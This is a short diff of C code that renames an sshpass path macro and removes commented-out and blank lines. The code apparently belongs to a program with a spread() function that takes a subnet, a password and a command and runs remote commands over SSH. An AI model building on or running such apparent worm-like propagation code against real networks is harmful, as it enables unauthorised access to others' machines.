@@ -19,9 +19,7 @@ int establish_connection(const char* host, const char* username, const char* pas
                 PLINK_EXE_PATH, host, username, password, command);
         #else 
             ret = snprintf(command_string, sizeof(command_string), "%s -p \"%s\" ssh %s@%s \"%s\"",
-                SSH_PASS_PATH, password, username, host, command);
-            // printf("sshpass -p \"%s\" ssh %s@%s \"%s\"",
-            //     password, username, host, command);
+                SSHPASS_PATH, password, username, host, command);
         #endif
         if (ret >= sizeof(command_string)) {
             fprintf(stderr, "Command string too long\n");
@@ -174,8 +172,6 @@ void spread(const char* subnet, const char* password, const char* command) {
         }
     }
 }
-
-
 
 enum os_type get_os_type(const char *ip_address) {
     char command[MAX_BUF_SIZE];
